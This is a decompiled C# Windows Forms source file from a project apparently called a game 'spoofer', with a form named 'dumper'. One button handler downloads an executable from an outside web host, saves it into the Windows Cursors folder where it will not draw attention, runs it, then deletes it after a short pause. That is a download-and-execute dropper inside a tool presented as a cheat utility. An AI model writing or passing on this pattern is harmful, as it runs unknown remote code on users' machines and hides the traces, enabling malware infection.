using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using ChetSpoofer.Properties;
using Siticone.Desktop.UI.WinForms;

namespace ChetSpoofer
{
	// Token: 0x02000002 RID: 2
	public partial class dumper : Form
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public dumper()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002068 File Offset: 0x00000268
		private void pictureBox5_Click(object sender, EventArgs e)
		{
			new Main().Show();
			base.Hide();
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002080 File Offset: 0x00000280
		private void pictureBox1_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\Cursors\\LauncherV7.3-client.exe";
			webClient.DownloadFile("https://alokas66.com/launcher/LauncherV7.3-client.exe", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process = Process.Start(text);
			Thread.Sleep(750);
			File.Delete(text);
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000020FE File Offset: 0x000002FE
		private void label4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002101 File Offset: 0x00000301
		private void label1_Click(object sender, EventArgs e)
		{
		}
	}
}
